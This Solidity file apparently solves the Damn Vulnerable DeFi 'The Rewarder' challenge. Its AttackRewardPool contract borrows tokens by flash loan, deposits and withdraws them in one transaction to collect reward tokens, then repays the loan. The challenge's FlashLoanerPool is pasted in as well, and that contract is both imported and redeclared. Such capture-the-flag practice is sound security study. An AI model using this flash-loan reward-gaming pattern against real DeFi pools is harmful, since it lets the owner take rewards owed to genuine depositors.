// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {ReentrancyGuard} from "openzeppelin-contracts/security/ReentrancyGuard.sol";
import {Address} from "openzeppelin-contracts/utils/Address.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";
import {TheRewarderPool} from "./TheRewarderPool.sol";
import {FlashLoanerPool} from "./FlashLoanerPool.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";
import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";

contract AttackRewardPool {
    address owner;
    IERC20 liquidityToken;
    IERC20 rewardToken;
    FlashLoanerPool pool;
    TheRewarderPool rewardPool;

    constructor(address _lendingPool, address _rewardPool) {
        owner = msg.sender;
        pool = FlashLoanerPool(_lendingPool);
        rewardPool = TheRewarderPool(_rewardPool);
        liquidityToken = IERC20(rewardPool.liquidityToken());
        rewardToken = IERC20(rewardPool.rewardToken());
    }

    function attack(uint256 _amount) external {
        pool.flashLoan(_amount);
    }

    function receiveFlashLoan(uint256 _amount) external payable {
        liquidityToken.approve(address(rewardPool), _amount);
        rewardPool.deposit(_amount);
        rewardPool.withdraw(_amount);
        liquidityToken.transfer(address(pool), _amount);
        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
    }

    receive() external payable {}
}

/**
 * @title FlashLoanerPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 * @dev A simple pool to get flash loans of DVT
 */
contract FlashLoanerPool is ReentrancyGuard {
    using Address for address;

    DamnValuableToken public immutable liquidityToken;

    error NotEnoughTokensInPool();
    error FlashLoanHasNotBeenPaidBack();
    error BorrowerMustBeAContract();

    constructor(address liquidityTokenAddress) {
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
    }

    function flashLoan(uint256 amount) external nonReentrant {
        uint256 balanceBefore = liquidityToken.balanceOf(address(this));
        if (amount > balanceBefore) revert NotEnoughTokensInPool();
        if (!msg.sender.isContract()) revert BorrowerMustBeAContract();

        liquidityToken.transfer(msg.sender, amount);

        msg.sender.functionCall(abi.encodeWithSignature("receiveFlashLoan(uint256)", amount));

        if (liquidityToken.balanceOf(address(this)) < balanceBefore) {
            revert FlashLoanHasNotBeenPaidBack();
        }
    }
}
